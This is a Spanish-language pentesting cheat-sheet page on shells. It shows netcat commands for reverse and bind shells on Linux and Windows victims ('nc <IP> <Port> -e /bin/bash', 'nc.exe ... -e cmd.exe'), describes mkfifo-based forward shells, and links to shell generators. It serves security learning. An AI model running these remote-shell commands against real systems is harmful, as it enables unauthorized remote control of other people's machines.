# Shells

## Reverse Shell

<figure><img src="../../.gitbook/assets/image (10) (1) (3).png" alt=""><figcaption><p>Target to Attacker</p></figcaption></figure>

### Atacante Linux

{% code overflow="wrap" %}
```bash
nc -lvnp <Port>
```
{% endcode %}

Donde:

* `-l` : Modo escucha
* `-v` : Modo verbose (Retorna Información de la conexión, se puede usar -vvv para mas información en la conexión).&#x20;
* `-n` : Deshabilitar resolución inversa de DNS
* `-p <Port>` : Establece el puerto de escucha

### Victima Linux

```bash
nc <IP> <Port> -e /bin/bash
```

### Víctima Windows

```bash
nc.exe <IP> <Port> –e cmd.exe
```



## Bind Shell

En algunos proyectos donde no puedas establecer un servidor de escucha por que te encuentres por NAT o por Firewall, a veces es conveniente de que la máquina victima esté en modo escucha ofreciendo la shell, a esto se le llama <mark style="color:green;">**Bind shell**</mark> o <mark style="color:green;">**shell directa.**</mark>

<figure><img src="../../.gitbook/assets/image (26) (2).png" alt=""><figcaption></figcaption></figure>

### Atacante Linux

```bash
nc <IP Target> <Port>
```

### Víctima Linux

{% code overflow="wrap" %}
```bash
nc -lvnp <Port> -e /bin/bash
```
{% endcode %}

### Víctima Windows

{% code overflow="wrap" %}
```bash
nc.exe -l -p <Port> -e cmd.exe
```
{% endcode %}

## Forward Shell

Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.

Puedes encontrar casos en los que tienes un RCE (Remote Code Execution) en una aplicación web en una máquina Linux pero debido a reglas Iptables u otro tipo de filtrado no puedes obtener una shell inversa.&#x20;

Esta técnica o tipo de "shell" te permite mantener un shell PTY a través de ese RCE usando tuberías dentro del sistema víctima.&#x20;

{% embed url="https://github.com/IppSec/forward-shell" %}

Sólo necesitas modificar La URL del host vulnerable El prefijo y sufijo de tu payload (si lo hay) La forma en que se envía el payload (¿encabezados? ¿datos? ¿información extra?) Luego, sólo tienes que enviar comandos o incluso utilizar el comando upgrade para obtener un PTY completo (ten en cuenta que las tuberías se leen y escriben con un retardo aproximado de 1,3s).



## Referencias

Generador de Revershells

{% embed url="https://www.revshells.com/" %}

{% embed url="https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/" %}
